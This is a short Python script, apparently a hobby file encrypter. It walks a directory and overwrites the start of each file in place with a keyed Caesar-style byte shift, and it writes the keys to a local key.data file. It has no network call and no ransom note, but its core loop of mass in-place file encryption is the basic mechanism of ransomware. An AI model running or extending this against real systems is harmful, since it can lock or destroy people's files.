import random as rd
import zipfile as zip
import KeyGen
import time
import os
import sys
import datetime
class Codingfile:
    def __init__(self):
        rd.seed(time.time())
        #log = open("logs.txt","a")#log
        self.pwd = KeyGen.GenerateKey(32)
        self.pwd2 = KeyGen.GenerateKey(63)
        #log.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] PWD Generated\n")#log
        self.offset,self.offset2 = self.caesar_offset(self.pwd, self.pwd2)
        Keys = open("key.data", 'w')
        Keys.write(f'{self.pwd}-{self.pwd2}')
        Keys.close()
        #log.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] PWD Writed\n")#log
        #log.close()#log

    def dir_encoding(self, dir):
        #log = open("logs.txt","a")#log
        for root, subdirs, files in os.walk(dir):
            for file in files:
                if file == "key.data" or file == "FilenameList" or file == "logs.txt" or file == os.path.basename(sys.argv[0]):
                    continue
                filefullpath = os.path.join(root, file)
                self.file_encoding(filefullpath)
                #log.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] {file} encoded\n")#log
        #log.close()#log
    def file_encoding(self, path):
        offset, offset2 = self.caesar_offset(self.pwd, self.pwd2)
        f = open(path, 'rb+')
        text = f.read(262144)
        f.close()
        f = open(path, 'rb+')
        f.write(self.caesar_encoding(text, offset, offset2))
        f.close()

    def file_full_encoding(self, path):
        offset, offset2 = self.caesar_offset(self.pwd, self.pwd2)
        #log = open("logs.txt","a")#log
        f = open(path, 'rb+')
        text = f.read()
        f.close()
        f = open(path, 'rb+')
        f.write(self.caesar_encoding(text, offset, offset2))
        f.close()
        #log.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}] {path} Full encoded\n")#log
        #log.close()#log
    @staticmethod
    def caesar_offset(pwd, pwd2):
        pwd = bytes(pwd, encoding="utf-8")
        pwd2 = bytes(pwd2, encoding="utf-8")
        offset = []
        offset2 = []

        for i in range(len(pwd)):
            offset.append(pwd[i])
        offset = traversal(offset)

        for i in range(len(pwd2)):
            offset2.append(pwd2[i])
        offset2 = traversal(offset2)
        return [offset, offset2]





    @staticmethod
    def caesar_encoding(text,offset, offset2):
        text = bytearray(text)
        for i in range(len(text)):
            text[i] = (text[i]+next(offset)+next(offset2)) % 256
        return text

def traversal(list):
    i = 0
    while True:
        length = len(list)
        i = i % length
        yield list[i]
        i += 1

if __name__ == "__main__":
    file = Codingfile()
    file.dir_encoding("D:\\Python\\renamer")
    #file.file_full_encoding("encryptbkp1.py")